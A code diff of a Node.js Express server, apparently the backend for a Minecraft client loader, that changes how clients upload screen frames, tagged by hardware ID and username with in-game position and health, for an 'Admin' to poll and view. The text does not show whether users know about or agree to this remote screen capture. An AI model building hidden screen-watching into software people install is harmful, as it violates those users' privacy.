@@ -24,60 +24,38 @@ const loaderServer = new LoaderServer(server);
 
 // ── Screen streaming via HTTP POST + polling ───────────
 const screenFrames = new Map();
-const multer = require('multer');
-const upload = multer({ storage: multer.memoryStorage(), limits: { fileSize: 500 * 1024 } });
 
-// Client posts screen data (multipart with binary frame)
-app.post('/api/screen', upload.single('frame'), (req, res) => {
+// Client posts screen data (JSON with base64 frame)
+app.post('/api/screen', (req, res) => {
     try {
-        const { hwid, username } = req.body;
+        const { hwid, username, frame, dim, x, y, z, health } = req.body || {};
         if (!hwid) return res.sendStatus(400);
         screenFrames.set(hwid, {
             hwid,
             username: username || '',
-            frame: req.file ? req.file.buffer : null,
+            frame: frame || null, // base64 encoded
+            dim: dim || '',
+            x: x || 0, y: y || 0, z: z || 0,
+            health: health || 0,
             time: Date.now()
         });
         res.sendStatus(200);
     } catch (e) { res.sendStatus(500); }
 });
 
-// Admin polls for screen data (returns JSON with metadata)
+// Admin polls for screen data
 app.get('/api/screen/:hwid', (req, res) => {
     const frame = screenFrames.get(req.params.hwid);
     if (!frame || Date.now() - frame.time > 10000) return res.json(null);
-    
-    // Parse metadata from frame (last bytes after last '|')
-    let meta = {};
-    if (frame.frame) {
-        try {
-            const str = frame.frame.toString('utf8');
-            const lastPipe = str.lastIndexOf('|');
-            if (lastPipe > 0) {
-                const metaStr = str.substring(str.lastIndexOf('\n', lastPipe) + 1);
-                const parts = metaStr.split('|');
-                if (parts.length >= 8) {
-                    meta = { dim: parts[3], x: parseInt(parts[4])||0, y: parseInt(parts[5])||0, z: parseInt(parts[6])||0, health: parseInt(parts[7])||0 };
-                }
-            }
-        } catch {}
-    }
-    
     res.json({
         hwid: frame.hwid,
         username: frame.username,
-        time: frame.time,
         hasFrame: !!frame.frame,
-        ...meta
+        dim: frame.dim,
+        x: frame.x, y: frame.y, z: frame.z,
+        health: frame.health,
+        time: frame.time
     });
-});
-
-// Get frame as binary (for canvas rendering)
-app.get('/api/screen/:hwid/raw', (req, res) => {
-    const frame = screenFrames.get(req.params.hwid);
-    if (!frame || !frame.frame || Date.now() - frame.time > 10000) return res.status(404).send('No frame');
-    res.setHeader('Content-Type', 'application/octet-stream');
-    res.send(frame.frame);
 });
 
 // Get all active screen streams
